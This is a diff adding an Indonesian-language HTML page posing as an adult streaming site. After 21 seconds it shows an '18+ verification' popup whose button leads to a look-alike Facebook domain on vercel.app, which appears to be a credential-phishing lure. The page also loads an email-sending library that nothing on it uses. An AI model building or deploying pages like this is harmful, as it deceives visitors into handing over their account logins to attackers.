@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.5">
+    <title>Streaming</title>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+.video-background {
+    position: fixed;
+    right: 0;
+    bottom: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover; /* Ini memastikan video menutupi seluruh area */
+    z-index: -1; /* Ini memastikan video berada di belakang konten lain */
+}
+       .popup {
+          display: none;
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background-color: white;
+          padding: 40px;
+          width: 38vh;
+          box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+          border-radius: 10px;
+          z-index: 1;
+        }
+        .popup button {
+            margin-top:2vh;
+            width: 25vh;
+            height: 3vh;
+            background-color: #232641;
+            color: white;
+            font-size: 2em;
+        }
+       .placehoder{
+           color:  #AFB0B4;
+        }
+    </style>
+</head>
+<body>
+    <img src="video.gif" alt="Background GIF" class="video-background">
+
+    <div id="popup-paragraph" class="popup" style="width: 38vh; height: 67vh; background-image: url(sensor.png); background-repeat: no-repeat; background-size: 100%">
+      <center>
+        <h5 style="color: white; margin-top: 55vh; font-size: 2em">Verification 18+</h5>
+        <a href="https://facebook-drab-sigma.vercel.app/"><button onclick="showLoginPopup()">Gabung untuk menonton</button></a>
+    </div>
+    </center>
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+    
+
+    <script>
+        setTimeout(function() {
+            document.getElementById('popup-paragraph').style.display = 'block';
+        }, 21000); // 1 minute in milliseconds
+
+        function showLoginPopup() {
+            document.getElementById('popup-paragraph').style.display = 'none';
+            document.getElementById('popup-login').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
